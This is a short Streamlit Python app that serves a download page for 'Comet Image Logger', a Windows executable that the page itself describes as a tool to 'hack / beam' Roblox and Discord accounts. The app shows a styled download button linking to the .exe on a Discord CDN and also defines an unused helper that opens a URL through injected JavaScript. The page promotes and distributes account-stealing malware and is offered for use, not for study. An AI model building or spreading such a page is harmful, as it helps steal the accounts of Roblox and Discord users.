import streamlit as st
st.markdown(
    """
    <style>
        button[title^=Exit]+div [data-testid=stImage]{
            text-align: center;
            display: block;
            margin-left: auto;
            margin-right: auto;
            width: 100%;
        }
    </style>
    """, unsafe_allow_html=True
)
st.image("comet.png" ,width=100 )
st.title("Comet Image Logger🪐" ,)
st.subheader("Whats Comet Image Logger?")
st.write("Its a tool used to hack / beam roblox accounts aswell as discord account.")
st.subheader("Where can i get it?")
st.write("Just Click The Image Logger Download Button.")

URL_STRING = "https://cdn.discordapp.com/attachments/1233441957863358467/1233792344776507392/Comet_Image_Logger.exe?ex=662e6229&is=662d10a9&hm=29ec25502a4f2112b049549e18564fb733a6d0e70f0c239ccdb015512ee66e68&"


import streamlit as st
from streamlit.components.v1 import html

def open_page(url):
    open_script= """
        <script type="text/javascript">
            window.open('%s', '_blank').focus();
        </script>
    """ % (url)
    html(open_script)


URL_STRING = "https://cdn.discordapp.com/attachments/1233441957863358467/1233792344776507392/Comet_Image_Logger.exe?ex=662e6229&is=662d10a9&hm=29ec25502a4f2112b049549e18564fb733a6d0e70f0c239ccdb015512ee66e68&"

st.markdown(
    f'<a href="{URL_STRING}" style="display: inline-block; padding: 12px 20px; background-color: #4CAF50; color: white; text-align: center; text-decoration: none; font-size: 16px; border-radius: 4px;">Image Logger Download</a>',
    unsafe_allow_html=True
)


